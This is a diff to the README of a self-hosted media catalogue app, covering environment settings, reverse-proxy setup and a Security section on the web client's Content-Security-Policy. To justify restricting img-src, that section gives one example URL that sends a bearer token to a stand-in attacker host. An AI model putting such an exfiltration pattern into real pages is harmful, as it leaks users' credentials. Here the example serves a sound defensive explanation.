@@ -39,6 +39,7 @@ cataloggy/
     web/        # React + Vite PWA frontend
   packages/
     shared/     # shared types/utilities
+    migrate/    # Prisma CLI only, for the migration image
   docker-compose.yml
   README.md
 ```
@@ -62,7 +63,6 @@ cataloggy/
    - **Optional integrations:** `TMDB_API_KEY`, `TRAKT_CLIENT_ID`, `TRAKT_CLIENT_SECRET` (in `api` service). `TMDB_API_KEY` can also be set from the app — the setup wizard asks for it, and **Settings → TMDB Metadata** changes it later — so a mistyped or rotated key doesn't mean editing this file and restarting. A key saved there takes precedence over this variable.
    - **Optional (Games section):** `TWITCH_CLIENT_ID`, `TWITCH_CLIENT_SECRET` (IGDB game search/metadata), `STEAM_API_KEY`, `STEAM_ID` (Steam library import) — in `api` service. Leaving these unset is safe, but the Games tab needs at least one pair configured to be useful: adding a game is done by searching IGDB, so it requires `TWITCH_CLIENT_ID`/`TWITCH_CLIENT_SECRET`; automatic library/playtime sync requires `STEAM_API_KEY`/`STEAM_ID`. With neither set, the Games tab has no way to populate itself.
    - **Optional:** `SENTRY_DSN` — reports unhandled errors from the `api`, `addon`, and `web` services to a Sentry project (or compatible service). Leave unset to disable; no error data leaves your server by default.
-   - **Optional:** `ALLOWED_HOSTS` (in `web` service) — comma-separated hostnames allowed to reach the web server beyond IPs/localhost, e.g. a domain proxied via Nginx Proxy Manager (see below). Leave unset for LAN-IP-only access.
    - **Optional:** `CSP_CONNECT_SRC_EXTRA` (in `web` service) — comma-separated extra origins the browser may connect to, on top of `VITE_API_BASE`, `VITE_ADDON_BASE` and `SENTRY_DSN`, which the web server's `Content-Security-Policy` already allows. Only needed if some browsers reach the API at a different address than `VITE_API_BASE` — e.g. one set per-browser under Settings → "API base URL", or a domain used alongside the LAN IP.
 
    **Internal vs. public URLs:** the `api` and `addon` services distinguish between the URL used for service-to-service traffic inside the Docker network and the URL your browser/Apple TV/Omni actually reach:
@@ -76,7 +76,7 @@ cataloggy/
 2. Start everything:
 
    ```bash
-   docker compose up --build
+   docker compose up -d
    ```
 
    **Pinning the version you run.** All four app images (`api`, `addon`, `web`, `migrate`) take their tag from `CATALOGGY_IMAGE_TAG` in your `.env`. Unset, it means `latest`, which always follows the most recent build from `main`: `docker compose pull` can move you onto an untested build, and there's no earlier version to fall back to. Once the stack works, pin it — every build is also published as `sha-<short-sha>`, and tagged releases as `vX.Y.Z`:
@@ -380,7 +380,7 @@ Configure Nginx Proxy Manager with one Proxy Host for your domain (for example, 
   - `/api/` → port `7000`
   - `/addon/` → port `7001`
 
-Set `ALLOWED_HOSTS=cataloggy.domain.com` in your `.env` so the web service accepts requests for that hostname, then restart the `web` service.
+There is nothing to set on the `web` service for the domain itself. The web container serves the built bundle with `serve`, which answers whatever `Host` it is given and has no allowlist to configure — so restricting which hostnames reach Cataloggy is the proxy's job, and Nginx Proxy Manager already does it: it forwards only the domains you have configured as Proxy Hosts. If you want everything else refused rather than falling through to whichever host happens to be first, add a default/catch-all Proxy Host that returns a 404.
 
 Also set `TRUST_PROXY` to the address the `api` container sees Nginx Proxy Manager connect from — its address on the Docker network, not its LAN address. `TRUST_PROXY=172.16.0.0/12` covers the default Docker bridge range and is the usual working answer. Without it the api and addon ignore the `X-Forwarded-For` header the proxy sends, so every request looks like it came from the proxy itself: one shared 200/min rate-limit budget for the whole household (the usual cause of "Too many requests" appearing out of nowhere), and `WEBHOOK_ALLOWED_IPS` can never match.
 
@@ -445,7 +445,7 @@ If you don't have a recent backup when this happens, don't guess at manually edi
 
 ## Security
 
-Cataloggy is designed for self-hosting on a trusted local network (LAN), not for direct exposure to the internet. Known limitations:
+Cataloggy is designed for self-hosting on a trusted local network (LAN), not for direct exposure to the internet. Found something outside that model? Report it privately — [.github/SECURITY.md](.github/SECURITY.md) covers where, which versions get fixes, and what is in scope. Known limitations:
 
 - The web client stores its API bearer token in `localStorage`. Any JavaScript running on the page (e.g. via an XSS vulnerability in a dependency) could read this token. Since the token only grants access to your own local API, this is an acceptable tradeoff for a LAN-only app. If exposing it via a reverse proxy, both the API and web client now send a restrictive `Content-Security-Policy` (no framing, and no inline script beyond the one the page itself ships, which is allowed by the SHA-256 hash of its exact contents rather than by `'unsafe-inline'`) plus `X-Content-Type-Options`/`X-Frame-Options`/`Referrer-Policy` headers to reduce the impact of a dependency-introduced XSS bug, but migrating to httpOnly session cookies would be a stronger fix if you need this on the internet.
 - That CSP's `connect-src` names only the origins this deployment actually talks to — `'self'`, plus `VITE_API_BASE`, `VITE_ADDON_BASE`, (if set) the `SENTRY_DSN` host, and the artwork CDNs the service worker caches posters from — rather than allowing every host, so script injected into the page cannot post your token to an arbitrary server. `img-src` names the same artwork CDNs (plus `'self'` and `data:`) for the same reason: an `<img>` is a request too, and pointing one at `https://attacker.example/?t=<token>` would carry the token out just as well as a `fetch` would, so leaving that directive open to every host would have undone the rest. `form-action 'self'` closes the third route out — `default-src` does not cover it, so without it injected markup could auto-submit a form off-origin. The header is rendered from `apps/web/serve.template.json` when the `web` container starts, since those origins are only known then. If some browser needs to reach an origin the container doesn't know about (most likely a per-browser API base set in Settings), add it to `CSP_CONNECT_SRC_EXTRA` — otherwise the browser will block the request. `style-src` still allows `'unsafe-inline'`, which the app's inline React styles require; style injection is far lower-risk than script injection, so that one is an accepted weakening.
